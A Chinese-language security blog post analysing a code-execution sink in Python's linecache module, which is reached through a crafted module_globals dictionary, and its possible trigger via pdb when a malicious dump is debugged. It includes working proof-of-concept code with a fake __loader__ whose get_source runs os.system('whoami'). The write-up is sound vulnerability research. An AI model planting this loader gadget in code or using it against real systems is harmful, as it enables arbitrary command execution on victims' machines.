---
title: "聊聊由linecache库可能引起的RCE问题"
date: 2025-04-14 12:50
updated: 2025-04-14 12:50
categories: "Notes"
tags:
  - "Web Security"
  - "Python"
description: "近几天闲的去翻python的标准库找点乐子，偶然发现linecache里可能出现的RCE问题。于是就尝试构造了个PoC去打着玩。结果发现假如对这个库的某些函数调用不当真的可以RCE。这也许是最近发现的一个不太明显的有意思的sink点，故写一篇文字记录一下。 Proof of Concept (PoC"
original_url: "https://www.cnblogs.com/LAMENTXU/articles/18824493"
---
近几天闲的去翻python的标准库找点乐子，偶然发现linecache里可能出现的RCE问题。于是就尝试构造了个PoC去打着玩。结果发现假如对这个库的某些函数调用不当真的可以RCE。这也许是最近发现的一个不太明显的有意思的sink点，故写一篇文字记录一下。

# Proof of Concept (PoC)

我们可以使用`linecache.getline`来缓存特定文件的某一行。但是假设`linecache.getline`的第三个参数完全为用户可控，则可以导致RCE问题。对于linecache中的`getlines`，`updatecache`同理。而`lazycache`也可能触发此类问题。

我们看到：

```
import linecache
class evil():
    def __init__(self):
        self.get_source = lambda a: [__import__('os').system(a), None][1]

fake_moudle = {
    '__name__': 'whoami',
    '__loader__': evil()
}
a = linecache.getline('LamentXU', 114514, fake_moudle)
```

成功执行`whoami`

![](/images/migrated/18824493/01.png)

其中最后一行代码为sink点。它有如下变形：

```
a = linecache.getline('LamentXU', 114514, fake_moudle)
a = linecache.getlines('LamentXU', fake_moudle)
a = linecache.updatecache('LamentXU', fake_moudle)
```

均可以直接RCE。

```
import linecache
class evil():
    def __init__(self):
        self.get_source = lambda a: [__import__('os').system(a), None][1]

fake_moudle = {
    '__name__': 'whoami',
    '__loader__': evil()
}
a = linecache.getline('LamentXU', 114514, fake_moudle)
a = linecache.getlines('LamentXU', fake_moudle)
a = linecache.updatecache('LamentXU', fake_moudle)
```

![](/images/migrated/18824493/02.png)

# Root Cause (原理)

## linecache简介

linecache是一个python标准库。在python编程中，有时我们需要访问文件的特定行，而不是按顺序逐行读取。linecache模块就是为解决这类问题而设计的，它提供了一种高效的方式来缓存文件内容，使得我们可以快速访问文件的任意一行。

linecache模块的主要作用是从文件中读取指定行的内容，并将文件内容缓存起来。这样，在后续再次访问同一文件的其他行时，就可以直接从缓存中获取，避免了重复的文件 I/O 操作，从而提高了程序的性能。

假设有代码如下：

```
import linecache
print(linecache.getline('1.txt', 1).strip())
```

就可以读取`1.txt`的第一行，输出。`getline`的前两个参数必选，为文件路径和行序列。但是第三个参数，即module\_globals是可选参数，通常用于指定模块的全局命名空间，一般使用默认值None即可。

但是，由于linecache对于module\_globals的处理不当，使攻击者可以传入恶意的module\_globals导致RCE。

## 利用链

我们跟进这个函数。

```
def getline(filename, lineno, module_globals=None):
    """Get a line for a Python source file from the cache.
    Update the cache if it doesn't contain an entry for this file already."""

    lines = getlines(filename, module_globals)
    if 1 <= lineno <= len(lines):
        return lines[lineno - 1]
    return ''
```

发现其调用了`getlines`。跟进：

```
def getlines(filename, module_globals=None):
    """Get the lines for a Python source file from the cache.
    Update the cache if it doesn't contain an entry for this file already."""

    if filename in cache:
        entry = cache[filename]
        if len(entry) != 1:
            return cache[filename][2]

    try:
        return updatecache(filename, module_globals)
    except MemoryError:
        clearcache()
        return []
```

在linecache库里有一个全局字典cache。用于存放已经缓存的代码行。getlines首先检查文件是否已经被缓存在cache里。如果没有，进入`updatecache`函数。我们跟进。

```
def updatecache(filename, module_globals=None):
    """Update a cache entry and return its list of lines.
    If something's wrong, print a message, discard the cache entry,
    and return an empty list."""

    if filename in cache:
        if len(cache[filename]) != 1:
            cache.pop(filename, None)
    if not filename or (filename.startswith('<') and filename.endswith('>')):
        return []

    fullname = filename
    try:
        stat = os.stat(fullname)
    except OSError:
        basename = filename

        # Realise a lazy loader based lookup if there is one
        # otherwise try to lookup right now.
        if lazycache(filename, module_globals):
            try:
                data = cache[filename][0]()
                # print(data)
            except (ImportError, OSError):
                pass
            else:
                if data is None:
                    # No luck, the PEP302 loader cannot find the source
                    # for this module.
                    return []
                cache[filename] = (
                    len(data),
                    None,
                    [line + '\n' for line in data.splitlines()],
                    fullname
                )
                return cache[filename][2]

        # Try looking through the module search path, which is only useful
        # when handling a relative filename.
        if os.path.isabs(filename):
            return []

        for dirname in sys.path:
            try:
                fullname = os.path.join(dirname, basename)
            except (TypeError, AttributeError):
                # Not sufficiently string-like to do anything useful with.
                continue
            try:
                stat = os.stat(fullname)
                break
            except OSError:
                pass
        else:
            return []
    try:
        with tokenize.open(fullname) as fp:
            lines = fp.readlines()
    except OSError:
        return []
    if lines and not lines[-1].endswith('\n'):
        lines[-1] += '\n'
    size, mtime = stat.st_size, stat.st_mtime
    cache[filename] = size, mtime, lines, fullname
    return lines
```

首先检查了filename是否缓存，若已经缓存则删除已缓存的内容。再检查filename是否存在。若不存在（OSError）则pass。进入`lazycache`，随后我们迎来了真正的sink：

```
data = cache[filename][0]()
```

`updatecache`函数会动态执行我们cache里的内容！所以，我们跟进`lazycache`函数，看看它是如何处理缓存的。

```
def lazycache(filename, module_globals):
    """Seed the cache for filename with module_globals.

    The module loader will be asked for the source only when getlines is
    called, not immediately.

    If there is an entry in the cache already, it is not altered.

    :return: True if a lazy load is registered in the cache,
        otherwise False. To register such a load a module loader with a
        get_source method must be found, the filename must be a cachable
        filename, and the filename must not be already cached.
    """
    if filename in cache:
        # print(len(cache[filename]))
        if len(cache[filename]) == 1:
            return True
        else:
            return False
    # print('he')
    if not filename or (filename.startswith('<') and filename.endswith('>')):
        return False
    # Try for a __loader__, if available
    if module_globals and '__loader__' in module_globals:
        name = module_globals.get('__name__')
        loader = module_globals['__loader__']
        get_source = getattr(loader, 'get_source', None)
        # print(name, loader, get_source)
        if name and get_source:
            get_lines = functools.partial(get_source, name)
            cache[filename] = (get_lines,)
            return True
    return False
```

到这里就有意思了。在程序的预期里，module\_globals应该是一个全局命名空间，所以有`__name__`和`__loader__`。这个函数会直接取出`__loader__`里的`get_source`并把`__name__`作为它的参数，返回一个`functools.partial`。那么，如何利用呢？

```
fake_moudle = {
    '__name__': 'whoami',
    '__loader__': evil()
}
```

我们构造这个`module_globals`。可以看到我们重定义了`__name__`和`__loader__`。这里我们只需要在`evil`这个类里写上恶意的`get_source`函数，这个函数就会得到执行！

```
import linecache
class evil():
    def __init__(self):
        self.get_source = lambda a: __import__('os').system(a)

fake_moudle = {
    '__name__': 'whoami',
    '__loader__': evil()
}
a = linecache.getline('LamentXU', 114514, fake_moudle)
```

但是如果这样的话，会报错。我们看到代码：

```
            try:
                data = cache[filename][0]()
                # print(data)
            except (ImportError, OSError):
                pass
            else:
                if data is None:
                    # No luck, the PEP302 loader cannot find the source
                    # for this module.
                    return []
                cache[filename] = (
                    len(data),
                    None,
                    [line + '\n' for line in data.splitlines()],
                    fullname
                )
                return cache[filename][2]
```

动态执行后，会检查返回值是否为None。所以我们这里还要使得lambda的返回值为None。修改PoC：

```
import linecache
class evil():
    def __init__(self):
        self.get_source = lambda a: [__import__('os').system(a), None][1]

fake_moudle = {
    '__name__': 'whoami',
    '__loader__': evil()
}
a = linecache.getline('LamentXU', 114514, fake_moudle)
```

即可成功RCE

# Special Tricks (特殊利用)

假设`lazycache`的参数可控，我们可以往cache里任意写。这其实没啥用，除非服务端手动去执行`lazycache`的代码，如下：

```
import linecache
class evil():
    def __init__(self):
        self.get_source = lambda : __import__('os').system('whoami')

fake_moudle = {
    '__name__': 'LamentXU',
    '__loader__': evil()
}
a = linecache.lazycache('1', fake_moudle)
for i in linecache.cache.values():
    for j in i:
        j.func()
```

同样可以达到RCE的效果。

# So What?

看到这里你可能会想：linecache的第三个参数怎么会可控呢？我们来看：

在python的PDB中，有调用了如下函数：

```
    def print_stack_trace(self):
        try:
            for frame_lineno in self.stack:
                self.print_stack_entry(frame_lineno)
        except KeyboardInterrupt:
            pass
```

这个函数在启动PDB的时候会自动调用，可以打印stack的信息。我们跟进`print_stack_entry`

```
    def print_stack_entry(self, frame_lineno, prompt_prefix=line_prefix):
        frame, lineno = frame_lineno
        if frame is self.curframe:
            prefix = '> '
        else:
            prefix = '  '
        self.message(prefix +
                     self.format_stack_entry(frame_lineno, prompt_prefix))
```

跟进`format_stack_entry`

```
    def format_stack_entry(self, frame_lineno, lprefix=': '):
        """Return a string with information about a stack entry.

        The stack entry frame_lineno is a (frame, lineno) tuple.  The
        return string contains the canonical filename, the function name
        or '<lambda>', the input arguments, the return value, and the
        line of code (if it exists).

        """
        import linecache, reprlib
        frame, lineno = frame_lineno
        filename = self.canonic(frame.f_code.co_filename)
        s = '%s(%r)' % (filename, lineno)
        if frame.f_code.co_name:
            s += frame.f_code.co_name
        else:
            s += "<lambda>"
        s += '()'
        if '__return__' in frame.f_locals:
            rv = frame.f_locals['__return__']
            s += '->'
            s += reprlib.repr(rv)
        line = linecache.getline(filename, lineno, frame.f_globals)
        if line:
            s += lprefix + line.strip()
        return s
```

此处的`frame.f_globals`为可控的`getline`参数。可以完成RCE。也就是说，同pickle类似，假设使用PDB调试恶意的dump。可能导致远程代码执行。

取材自：[https://github.com/gaogaotiantian/coredumpy/issues/59](https://github.com/gaogaotiantian/coredumpy/issues/59)
